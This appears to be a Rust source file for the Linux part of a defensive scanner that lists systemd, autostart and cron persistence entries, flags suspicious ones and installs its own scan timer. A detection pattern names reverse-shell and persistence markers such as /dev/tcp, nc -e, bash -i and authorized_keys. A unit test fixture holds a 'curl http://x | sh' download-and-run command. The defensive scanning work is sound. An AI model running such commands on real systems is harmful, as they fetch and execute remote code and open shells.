use super::*;
use crate::model::Scope;
use crate::runner::{Runner, SystemRunner};
use std::sync::Arc;

const UNIT_PREFIX: &str = "sheshnag.";
const CRON_MARK: &str = "# sheshnag";

#[derive(Clone, Copy, PartialEq)]
enum Kind {
    Systemd,
    Desktop,
    Cron,
}

pub struct Linux {
    home: PathBuf,
    /// Filesystem root, `/` in normal use. Tests point it at a temporary folder.
    root: PathBuf,
    runner: Arc<dyn Runner>,
}

impl Linux {
    pub fn new(home: PathBuf) -> Self {
        Self::with_parts(home, PathBuf::from("/"), Arc::new(SystemRunner))
    }

    pub fn with_parts(home: PathBuf, root: PathBuf, runner: Arc<dyn Runner>) -> Self {
        Self { home, root, runner }
    }

    fn user_dirs(&self) -> Vec<(PathBuf, Kind)> {
        vec![
            (self.home.join(".config/systemd/user"), Kind::Systemd),
            (self.home.join(".config/autostart"), Kind::Desktop),
        ]
    }

    fn system_dirs(&self) -> Vec<(PathBuf, Kind)> {
        vec![
            (self.root.join("etc/systemd/system"), Kind::Systemd),
            (self.root.join("etc/xdg/autostart"), Kind::Desktop),
            (self.root.join("etc/cron.d"), Kind::Cron),
        ]
    }

    fn unit_dir(&self) -> PathBuf {
        self.home.join(".config/systemd/user")
    }

    fn reload(&self) -> bool {
        self.runner.run("systemctl", &["--user", "daemon-reload"]).code != -1
    }

    fn cron_has_mark(&self) -> bool {
        self.runner.run("crontab", &["-l"]).stdout.contains(CRON_MARK)
    }
}

/// Commands a unit or desktop file would run, in one string.
pub fn parse_unit_commands(text: &str) -> String {
    const KEYS: [&str; 8] =
        ["ExecStart", "ExecStartPre", "ExecStartPost", "ExecStop", "ExecStopPost", "ExecReload", "Exec", "TryExec"];
    text.lines()
        .filter_map(|line| {
            let (key, value) = line.trim().split_once('=')?;
            if KEYS.contains(&key.trim()) {
                Some(value.trim().trim_start_matches(['-', '@', '+', '!', ':']).to_owned())
            } else {
                None
            }
        })
        .collect::<Vec<_>>()
        .join(" ; ")
}

fn parse_cron_file(text: &str) -> String {
    text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')).collect::<Vec<_>>().join(" ; ")
}

impl Platform for Linux {
    fn name(&self) -> &'static str {
        "Linux"
    }
    fn noun(&self) -> &'static str {
        "startup unit"
    }
    fn schedule_name(&self) -> &'static str {
        "crontab"
    }
    fn home(&self) -> &Path {
        &self.home
    }
    fn current_user(&self) -> String {
        user_from(self.runner.as_ref())
    }

    fn persistence(&self) -> Vec<Entry> {
        let mut out = Vec::new();
        let groups = self
            .user_dirs()
            .into_iter()
            .map(|(d, k)| (d, k, Scope::User))
            .chain(self.system_dirs().into_iter().map(|(d, k)| (d, k, Scope::System)));
        for (dir, kind, scope) in groups {
            let accept = move |p: &Path| {
                let ext = p.extension().map(|e| e.to_string_lossy().into_owned()).unwrap_or_default();
                match kind {
                    Kind::Systemd => ["service", "timer", "socket", "path"].contains(&ext.as_str()),
                    Kind::Desktop => ext == "desktop",
                    Kind::Cron => !file_name(p).starts_with('.'),
                }
            };
            for path in list_files(&dir, accept) {
                let Ok(bytes) = std::fs::read(&path) else { continue };
                let text = String::from_utf8_lossy(&bytes);
                let command = if kind == Kind::Cron { parse_cron_file(&text) } else { parse_unit_commands(&text) };
                out.push(Entry {
                    id: path.to_string_lossy().into_owned(),
                    label: file_name(&path),
                    command,
                    fingerprint: crate::util::hash16(&bytes),
                    scope,
                    file: Some(path),
                });
            }
        }
        out
    }

    fn impersonation(&self, e: &Entry) -> Option<String> {
        let name = e.label.to_lowercase();
        let looks_system = ["systemd-", "dbus-", "kworker", "kthreadd", "polkit", "udev"].iter().any(|p| name.starts_with(p));
        if looks_system && e.scope == Scope::User {
            Some("System-looking name in your own config, the system never puts one there".to_owned())
        } else {
            None
        }
    }

    fn is_own(&self, e: &Entry) -> bool {
        e.label.starts_with(UNIT_PREFIX)
    }

    fn extra_hiders(&self) -> &'static str {
        r"/dev/shm|/var/tmp|/dev/tcp/|nc -e|ncat |bash -i|LD_PRELOAD|chmod \+x|socat |mkfifo|authorized_keys"
    }

    fn cpu_allowlist(&self) -> &'static [&'static str] {
        &["rustc", "cargo", "clang", "gcc", "g++", "cc1", "cc1plus", "ld", "lld", "make", "ninja", "cmake", "ffmpeg", "ollama", "handbrake", "blender"]
    }

    fn processes(&self) -> Vec<Proc> {
        parse_ps(&self.runner.run("ps", &["-Ao", "pid,pcpu,user,comm,args"]).stdout)
    }

    fn startup_files(&self) -> Vec<PathBuf> {
        [
            ".bashrc", ".bash_profile", ".bash_login", ".profile", ".zshrc", ".zprofile", ".zshenv",
            ".config/fish/config.fish", ".ssh/authorized_keys",
        ]
        .iter()
        .map(|f| self.home.join(f))
        .collect()
    }

    fn schedule(&self) -> Vec<String> {
        sorted_lines(&self.runner.run("crontab", &["-l"]).stdout)
    }

    fn login_items(&self) -> Vec<String> {
        // Autostart entries are already covered as startup units.
        Vec::new()
    }

    fn notify(&self, title: &str, subtitle: &str, body: &str) {
        let heading = format!("{title}: {subtitle}");
        self.runner.run("notify-send", &["-u", "critical", &heading, body]);
    }

    fn monitor_installed(&self) -> bool {
        self.unit_dir().join("sheshnag.timer").is_file() || self.cron_has_mark()
    }

    fn install_monitor(&self, exe: &Path, _state_dir: &Path) -> Result<(), String> {
        let exe_text = exe.to_string_lossy();
        let service = format!(
            "[Unit]\nDescription=Sheshnag scan\n\n[Service]\nType=oneshot\nExecStart=\"{exe_text}\" dekho quiet\n"
        );
        let timer = "[Unit]\nDescription=Run Sheshnag every 10 minutes\n\n[Timer]\nOnBootSec=2min\nOnUnitActiveSec=10min\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n";
        write_creating(&self.unit_dir().join("sheshnag.service"), service.as_bytes())?;
        write_creating(&self.unit_dir().join("sheshnag.timer"), timer.as_bytes())?;
        if self.reload() && self.runner.run("systemctl", &["--user", "enable", "--now", "sheshnag.timer"]).ok() {
            return Ok(());
        }
        // No user systemd: fall back to cron.
        let _ = std::fs::remove_file(self.unit_dir().join("sheshnag.service"));
        let _ = std::fs::remove_file(self.unit_dir().join("sheshnag.timer"));
        let mut lines: Vec<String> = self
            .runner
            .run("crontab", &["-l"])
            .stdout
            .lines()
            .filter(|l| !l.contains(CRON_MARK))
            .map(str::to_owned)
            .collect();
        lines.push(format!("*/10 * * * * \"{exe_text}\" dekho quiet {CRON_MARK}"));
        let out = self.runner.run_input("crontab", &["-"], &(lines.join("\n") + "\n"));
        if out.ok() { Ok(()) } else { Err(format!("could not install the schedule: {}", out.stderr.trim())) }
    }

    fn remove_monitor(&self) -> Result<(), String> {
        self.runner.run("systemctl", &["--user", "disable", "--now", "sheshnag.timer"]);
        let _ = std::fs::remove_file(self.unit_dir().join("sheshnag.timer"));
        let _ = std::fs::remove_file(self.unit_dir().join("sheshnag.service"));
        self.reload();
        let current = self.runner.run("crontab", &["-l"]).stdout;
        if current.contains(CRON_MARK) {
            let kept: Vec<&str> = current.lines().filter(|l| !l.contains(CRON_MARK)).collect();
            self.runner.run_input("crontab", &["-"], &(kept.join("\n") + "\n"));
        }
        Ok(())
    }

    fn stop(&self, id: &str, label: &str) -> Result<(), String> {
        let name = if id.is_empty() { label.to_owned() } else { file_name(Path::new(id)) };
        if [".service", ".timer", ".socket", ".path"].iter().any(|s| name.ends_with(s)) {
            self.runner.run("systemctl", &["--user", "disable", "--now", &name]);
        }
        Ok(())
    }

    fn remove(&self, id: &str) -> Result<(), String> {
        std::fs::remove_file(id).map_err(|e| format!("{id}: {e}"))?;
        self.reload();
        Ok(())
    }

    fn export(&self, id: &str) -> Result<Vec<u8>, String> {
        std::fs::read(id).map_err(|e| format!("{id}: {e}"))
    }

    fn import(&self, id: &str, data: &[u8]) -> Result<(), String> {
        write_creating(Path::new(id), data)?;
        self.reload();
        Ok(())
    }

    fn kill(&self, pid: u32) -> Result<(), String> {
        let out = self.runner.run("kill", &["-9", &pid.to_string()]);
        if out.ok() { Ok(()) } else { Err(format!("kill {pid}: {}", out.stderr.trim())) }
    }

    fn destroyable(&self, id: &str) -> Result<(), String> {
        let roots: Vec<PathBuf> = self.user_dirs().into_iter().map(|(d, _)| d).collect();
        let mut protected: Vec<PathBuf> =
            ["bin", "sbin", "usr", "lib", "lib64", "etc", "boot", "proc", "sys", "var/lib"]
                .iter()
                .map(|d| self.root.join(d))
                .collect();
        protected.extend(user_protected_dirs(&self.home));
        file_destroyable(id, &roots, &protected)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unit_commands_are_joined_and_prefixes_stripped() {
        let text = "[Service]\nExecStartPre=-/bin/true\nExecStart=/usr/bin/curl http://x | sh\nRestart=always\n";
        assert_eq!(parse_unit_commands(text), "/bin/true ; /usr/bin/curl http://x | sh");
    }

    #[test]
    fn desktop_exec_line_is_read() {
        assert_eq!(parse_unit_commands("[Desktop Entry]\nExec=/tmp/x --y\nName=Z\n"), "/tmp/x --y");
    }

    #[test]
    fn cron_comments_are_ignored() {
        assert_eq!(parse_cron_file("# c\n\n* * * * * root /tmp/a\n"), "* * * * * root /tmp/a");
    }
}
